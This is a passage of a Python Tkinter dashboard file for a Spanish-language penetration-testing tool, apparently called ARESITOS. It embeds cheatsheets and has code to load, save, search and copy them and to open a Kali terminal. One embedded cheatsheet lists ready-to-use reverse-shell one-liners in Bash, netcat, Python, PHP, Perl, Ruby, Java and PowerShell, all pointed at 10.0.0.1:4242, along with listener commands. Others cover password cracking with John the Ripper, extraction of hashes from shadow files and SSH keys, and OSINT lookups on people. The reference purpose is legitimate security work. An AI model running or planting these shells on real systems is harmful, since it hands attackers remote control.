find / -writable 2>/dev/null      # Archivos escribibles
getcap -r / 2>/dev/null           # Capabilities
crontab -l                        # Cron jobs del usuario
cat /etc/crontab                  # Cron jobs del sistema

## Análisis de Logs
tail -f /var/log/auth.log         # Logs de autenticación
tail -f /var/log/syslog           # Logs del sistema
grep "Failed password" /var/log/auth.log  # Intentos fallidos
journalctl -f                     # Systemd logs
lastlog                           # Último login de usuarios

## Red y Conectividad
ifconfig                          # Interfaces de red
ip addr show                      # Interfaces (ip command)
route -n                          # Tabla de rutas
arp -a                            # Tabla ARP
netstat -rn                       # Rutas de red
lsof -i                           # Archivos y puertos abiertos
tcpdump -i eth0                   # Captura de tráfico

## Forense Básico
strings archivo                   # Cadenas legibles
hexdump -C archivo                # Dump hexadecimal
file archivo                      # Tipo de archivo
stat archivo                      # Metadatos del archivo
find /home -name "*.txt" -mtime -1 # Archivos modificados ayer
""",
            
            "John the Ripper": """
# JOHN THE RIPPER CHEATSHEET

## Comandos Básicos
john --list=formats               # Formatos soportados
john hashes.txt                   # Ataque por diccionario
john --show hashes.txt            # Mostrar passwords crackeadas
john --restore                    # Restaurar sesión

## Tipos de Hash
john --format=raw-md5 hash.txt    # MD5
john --format=raw-sha1 hash.txt   # SHA1
john --format=raw-sha256 hash.txt # SHA256
john --format=nt hash.txt         # NTLM
john --format=lm hash.txt         # LM

## Modos de Ataque
john --single hashes.txt          # Single crack mode
john --wordlist=rockyou.txt hashes.txt  # Dictionary attack
john --incremental hashes.txt     # Brute force
john --external=mode hashes.txt   # External mode

## Opciones Útiles
john --users=admin hashes.txt     # Solo usuario específico
john --groups=0 hashes.txt        # Solo grupo específico
john --shell=/bin/bash hashes.txt # Solo usuarios con shell
john --salts=-1 hashes.txt        # Sin salt específico

## Generación de Wordlists
john --wordlist=base.txt --rules --stdout > new.txt
john --incremental=Digits --stdout --session=digits

## Extracción de Hashes
unshadow passwd shadow > combined.txt    # Combinar passwd/shadow
pdf2john file.pdf > hash.txt             # PDF
zip2john file.zip > hash.txt             # ZIP
rar2john file.rar > hash.txt             # RAR
ssh2john id_rsa > hash.txt               # SSH key
""",
            
            "Reverse Shells": """
# REVERSE SHELLS CHEATSHEET

## Bash
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1'
0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

## Netcat
nc -e /bin/sh 10.0.0.1 4242          # Con -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f

## Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## PHP
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php system('bash -c "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"'); ?>

## Perl
perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## Ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()

## PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

## Listeners
nc -lvnp 4242                     # Netcat listener
socat file:`tty`,raw,echo=0 tcp-listen:4242  # Socat listener
rlwrap nc -lvnp 4242              # Con readline
""",
            
            "🔍 OSINT": """
# OSINT (Open Source Intelligence) CHEATSHEET

## Búsqueda de Dominios
whois domain.com                  # Información WHOIS
dig domain.com                    # DNS lookup
nslookup domain.com              # DNS lookup alternativo
host domain.com                  # Host lookup
theHarvester -d domain.com -b google  # Email harvesting

## Subdominios
sublist3r -d domain.com          # Enumeración de subdominios
amass enum -d domain.com         # Mapeo de subdominios
gobuster dns -d domain.com -w wordlist.txt  # Brute force DNS

## Google Dorks
site:domain.com                  # Páginas de un sitio
filetype:pdf site:domain.com     # PDFs del sitio
inurl:admin site:domain.com      # URLs con "admin"
intitle:"index of" site:domain.com  # Directorios listados
cache:domain.com                 # Caché de Google

## Shodan
shodan search apache             # Buscar Apache servers
shodan search port:22            # SSH servers
shodan search country:ES         # Dispositivos en España
shodan search org:"Company Name" # Por organización

## Redes Sociales
sherlock username                # Buscar username en redes
social-analyzer -u username      # Análisis de redes sociales
twint -u username                # Twitter scraping

## Metadatos
exiftool image.jpg               # Metadatos de imagen
metagoofil -d domain.com -t pdf  # Metadatos de documentos
foca                             # Fingerprinting Organizations

## Herramientas Web
archive.org                      # Wayback Machine
censys.io                        # Motor de búsqueda de dispositivos
builtwith.com                    # Tecnologías de sitios web
netcraft.com                     # Información de hosting

## Phone Numbers
phoneinfoga scan -n +34123456789 # Información de teléfonos
truecaller                       # Base de datos de números
""",
            
            "Log Analysis": """
# LOG ANALYSIS CHEATSHEET

## Ubicaciones de Logs Comunes
/var/log/auth.log                # Autenticación (Debian/Ubuntu)
/var/log/secure                  # Autenticación (RedHat/CentOS)
/var/log/syslog                  # Mensajes del sistema
/var/log/messages                # Mensajes generales
/var/log/kern.log                # Kernel messages
/var/log/apache2/access.log      # Apache access logs
/var/log/apache2/error.log       # Apache error logs
/var/log/nginx/access.log        # Nginx access logs
/var/log/nginx/error.log         # Nginx error logs

## Comandos de Análisis
tail -f /var/log/auth.log        # Seguimiento en tiempo real
grep "Failed password" /var/log/auth.log  # Intentos fallidos
grep "Accepted" /var/log/auth.log # Login exitosos
awk '{print $1}' access.log | sort | uniq -c | sort -nr  # IPs más frecuentes

## SSH Attack Detection
grep "Invalid user" /var/log/auth.log     # Usuarios inválidos
grep "Failed password" /var/log/auth.log | grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}' | sort | uniq -c | sort -nr  # IPs con más fallos

## Web Log Analysis
awk '{print $7}' access.log | sort | uniq -c | sort -nr  # URLs más solicitadas
awk '{print $1}' access.log | sort | uniq -c | sort -nr  # IPs más activas
grep " 404 " access.log          # Errores 404
grep " 500 " access.log          # Errores del servidor

## Log Filtering by Time
awk '$0 ~ /Dec 25 1[0-5]:/ {print}' /var/log/syslog  # Entre 10:00-15:59
sed -n '/Dec 25 10:00/,/Dec 25 15:00/p' /var/log/syslog  # Rango horario

## Security Events
grep -i "attack\\|hack\\|exploit\\|malware" /var/log/syslog
grep -E "(sudo|su):" /var/log/auth.log   # Uso de sudo/su
grep "session opened" /var/log/auth.log   # Sesiones abiertas

## Log Rotation
logrotate -d /etc/logrotate.conf # Dry run de rotación
journalctl --since "2023-01-01" # Logs desde fecha
journalctl -u ssh                # Logs de servicio específico
""",
        }
    
    def cargar_cheatsheet(self, event):
        """Cargar cheatsheet seleccionado desde archivo."""
        try:
            import os
            
            selection = self.categorias_chuletas.curselection()
            if selection:
                categoria = self.categorias_chuletas.get(selection[0])
                self.categoria_actual = categoria
                
                # Mapear nombre de categoría a archivo
                archivo_map = {
                    "Nmap - Escaneo de Puertos": "nmap_basico.txt",
                    "Metasploit Framework": "metasploit_framework.txt",
                    "Comandos Linux Seguridad": "comandos_linux.txt",
                    "Shells Inversas": "shells_inversas.txt",
                    "John the Ripper": "john_the_ripper.txt",
                    "Burp Suite": "burp_suite.txt",
                    "Análisis de Logs": "analisis_logs.txt",
                    "OSINT Básico": "osint_basico.txt"
                }
                
                archivo = archivo_map.get(categoria, None)
                if archivo:
                    archivo_path = os.path.join("data", "cheatsheets", archivo)
                    
                    if os.path.exists(archivo_path):
                        with open(archivo_path, 'r', encoding='utf-8') as f:
                            contenido = f.read()
                            self.cheatsheet_text.delete(1.0, tk.END)
                            self.cheatsheet_text.insert(1.0, contenido)
                    else:
                        self.cheatsheet_text.delete(1.0, tk.END)
                        self.cheatsheet_text.insert(1.0, f"# CHEATSHEET: {categoria}\n\nArchivo no encontrado: {archivo_path}\n\nPuedes crear este cheatsheet editando este contenido y guardando.")
                else:
                    self.cheatsheet_text.delete(1.0, tk.END)
                    self.cheatsheet_text.insert(1.0, f"# CHEATSHEET: {categoria}\n\nCheatsheet personalizado - añade tu contenido aquí.\n\nGuarda los cambios para crear el archivo.")
                    
        except Exception as e:
            print(f"Error cargando cheatsheet: {e}")
            self.cheatsheet_text.delete(1.0, tk.END)
            self.cheatsheet_text.insert(1.0, f"Error cargando cheatsheet: {str(e)}")
    
    def guardar_cheatsheet(self):
        """Guardar cambios en el cheatsheet actual."""
        try:
            import os
            
            if not hasattr(self, 'categoria_actual'):
                print("No hay categoría seleccionada")
                return
                
            # Mapear nombre de categoría a archivo
            archivo_map = {
                "Nmap - Escaneo de Puertos": "nmap_basico.txt",
                "Metasploit Framework": "metasploit_framework.txt",
                "Comandos Linux Seguridad": "comandos_linux.txt",
                "Shells Inversas": "shells_inversas.txt",
                "John the Ripper": "john_the_ripper.txt",
                "Burp Suite": "burp_suite.txt",
                "Análisis de Logs": "analisis_logs.txt",
                "OSINT Básico": "osint_basico.txt"
            }
            
            archivo = archivo_map.get(self.categoria_actual, f"{self.categoria_actual.lower().replace(' ', '_')}.txt")
            archivo_path = os.path.join("data", "cheatsheets", archivo)
            
            # Crear directorio si no existe
            os.makedirs(os.path.dirname(archivo_path), exist_ok=True)
            
            # Guardar contenido
            contenido = self.cheatsheet_text.get(1.0, tk.END).rstrip()
            with open(archivo_path, 'w', encoding='utf-8') as f:
                f.write(contenido)
                
            # Feedback visual
            self.btn_guardar.configure(text="Guardado", bg="#5cb85c")
            self.after(2000, lambda: self.btn_guardar.configure(text="Guardar Cambios", bg=self.colors['button_bg']))
            
        except Exception as e:
            print(f"Error guardando cheatsheet: {e}")
            self.btn_guardar.configure(text="Error al guardar", bg="#d9534f")
            self.after(2000, lambda: self.btn_guardar.configure(text="Guardar Cambios", bg=self.colors['button_bg']))
    
    def copiar_comando_seleccionado(self):
        """Copiar comando seleccionado al portapapeles."""
        try:
            if self.cheatsheet_text.selection_get():
                selected_text = self.cheatsheet_text.selection_get()
                self.clipboard_clear()
                self.clipboard_append(selected_text)
                # Mostrar feedback visual
                self.btn_copiar.configure(text="Copiado", bg="#5cb85c")
                self.after(2000, lambda: self.btn_copiar.configure(text="Copiar Comando", bg=self.colors['button_bg']))
        except tk.TclError:
            # No hay texto seleccionado
            pass
        except Exception as e:
            print(f"Error copiando comando: {e}")
    
    def buscar_en_cheatsheet(self):
        """Buscar texto en el cheatsheet actual."""
        try:
            search_term = self.entry_buscar.get().strip()
            if not search_term:
                return
            
            # Limpiar búsquedas anteriores
            self.cheatsheet_text.tag_remove("search", "1.0", tk.END)
            
            # Buscar y resaltar
            start_pos = "1.0"
            found_count = 0
            
            while True:
                pos = self.cheatsheet_text.search(search_term, start_pos, tk.END, nocase=True)
                if not pos:
                    break
                
                end_pos = f"{pos}+{len(search_term)}c"
                self.cheatsheet_text.tag_add("search", pos, end_pos)
                start_pos = end_pos
                found_count += 1
            
            # Configurar tag de resaltado
            self.cheatsheet_text.tag_configure("search", background="#ffff00", foreground="#000000")
            
            # Ir al primer resultado
            if found_count > 0:
                first_pos = self.cheatsheet_text.search(search_term, "1.0", tk.END, nocase=True)
                self.cheatsheet_text.see(first_pos)
                self.btn_buscar.configure(text=f"{found_count} encontrados")
                self.after(3000, lambda: self.btn_buscar.configure(text="Buscar"))
            else:
                self.btn_buscar.configure(text="No encontrado")
                self.after(2000, lambda: self.btn_buscar.configure(text="Buscar"))
                
        except Exception as e:
            print(f"Error en búsqueda: {e}")
    
    def abrir_terminal_kali(self):
        """Abrir terminal real de Kali Linux con configuración optimizada."""
        try:
            import subprocess
            import platform
            import os
            
            print("Intentando abrir terminal de Kali Linux...")
            
            if platform.system() == "Linux":
                # Intentar detectar entorno de escritorio y terminal disponible
                terminals_kali = [
                    "qterminal",       # QTerminal (KDE/Kali)
                    "gnome-terminal",  # GNOME Terminal
                    "konsole",         # KDE Konsole  
                    "xfce4-terminal",  # XFCE Terminal
                    "mate-terminal",   # MATE Terminal
                    "lxterminal",      # LXDE Terminal
                    "terminator",      # Terminator
                    "tilix",           # Tilix
                    "x-terminal-emulator", # Debian alternatives
                    "xterm"            # Básico X Terminal
                ]
                
                terminal_cmd = None
                for terminal in terminals_kali:
                    try:
                        # Verificar si el terminal está disponible
                        resultado = subprocess.run(
                            ["which", terminal], 
                            capture_output=True, 
                            text=True
                        )
                        if resultado.returncode == 0:
                            terminal_cmd = terminal
                            break
                    except:
                        continue
                
                if terminal_cmd:
                    # Configurar comando según el terminal disponible
                    if terminal_cmd in ["gnome-terminal", "mate-terminal"]:
                        cmd = [terminal_cmd, "--title=ARESITOS Kali Terminal", "--"]
                    elif terminal_cmd in ["konsole", "qterminal"]:
                        cmd = [terminal_cmd, "-T", "ARESITOS Kali Terminal"]
                    elif terminal_cmd in ["xfce4-terminal", "lxterminal"]:
                        cmd = [terminal_cmd, "--title=ARESITOS Kali Terminal"]
                    elif terminal_cmd == "terminator":
                        cmd = [terminal_cmd, "--title=ARESITOS Kali Terminal"]
                    elif terminal_cmd == "tilix":
                        cmd = [terminal_cmd, "--title=ARESITOS Kali Terminal"]
                    else:
                        cmd = [terminal_cmd]
                    
                    # Ejecutar terminal en background
                    if os.name == 'posix':  # Unix/Linux/macOS
                        subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            preexec_fn=os.setsid
                        )
                    else:  # Windows
                        subprocess.Popen(
                            cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP
                        )
                    
                    print(f"✅ Terminal {terminal_cmd} abierto exitosamente")
                    self.mostrar_notificacion(f"Terminal {terminal_cmd} iniciado", "info")
                    
                else:
                    # Fallback: intentar xterm básico
                    subprocess.Popen(
                        ["xterm", "-title", "ARESITOS Kali Terminal"],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    print("✅ Terminal xterm abierto como fallback")
                    self.mostrar_notificacion("Terminal xterm iniciado", "info")
                    
            elif platform.system() == "Windows":
                # En Windows, abrir WSL o PowerShell con mensaje
                try:
                    # Intentar WSL primero (para Kali en WSL)
                    subprocess.Popen(
                        ["wsl", "-d", "kali-linux"],
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    print("✅ WSL Kali Linux abierto")
                    self.mostrar_notificacion("WSL Kali Linux iniciado", "info")
                except:
                    # Fallback a PowerShell
                    subprocess.Popen(
                        ["powershell", "-WindowStyle", "Normal"],
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    print("✅ PowerShell abierto (Kali no detectado en WSL)")
                    self.mostrar_notificacion("PowerShell iniciado - Kali no detectado", "warning")
                    
            else:
                # macOS u otro sistema
                subprocess.Popen(
                    ["open", "-a", "Terminal"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print("✅ Terminal del sistema abierto")
                self.mostrar_notificacion("Terminal del sistema iniciado", "info")
                
        except Exception as e:
            print(f"❌ Error abriendo terminal: {e}")
            self.mostrar_notificacion(f"Error: {str(e)}", "error")
    
    def mostrar_notificacion(self, mensaje, tipo="info"):
        """Mostrar notificación temporal en la interfaz."""
        try:
            # Crear ventana de notificación temporal
            ventana_notif = tk.Toplevel(self)
            ventana_notif.title("ARESITOS")
            ventana_notif.geometry("400x100")
            ventana_notif.resizable(False, False)
            
            # Configurar colores según tipo
            colores = {
                "info": {"bg": "#d4edda", "fg": "#155724"},
                "warning": {"bg": "#fff3cd", "fg": "#856404"},
                "error": {"bg": "#f8d7da", "fg": "#721c24"}
            }
            
            color = colores.get(tipo, colores["info"])
            ventana_notif.configure(bg=color["bg"])
            
            # Etiqueta del mensaje
            label = tk.Label(
                ventana_notif,
                text=mensaje,
                bg=color["bg"],
                fg=color["fg"],
                font=("Arial", 11, "bold"),
                wraplength=350
            )
            label.pack(expand=True, fill="both", padx=10, pady=10)
            
            # Centrar ventana
            ventana_notif.update_idletasks()
            x = (ventana_notif.winfo_screenwidth() // 2) - (400 // 2)
            y = (ventana_notif.winfo_screenheight() // 2) - (100 // 2)
            ventana_notif.geometry(f"400x100+{x}+{y}")
            
            # Auto cerrar después de 3 segundos
            ventana_notif.after(3000, ventana_notif.destroy)
            
        except Exception as e:
            print(f"Error mostrando notificación: {e}")
    
    def destroy(self):
        """Limpiar recursos al destruir la vista."""
        self.detener_actualizacion_metricas()
        super().destroy()

# RESUMEN: Dashboard optimizado para expertos en ciberseguridad con:
# - Métricas específicas actualizadas cada 60 segundos
# - Información de IPs local y pública
# - Interfaces de red detalladas
# - Terminal integrado con comandos rápidos
# - Consumo de recursos optimizado
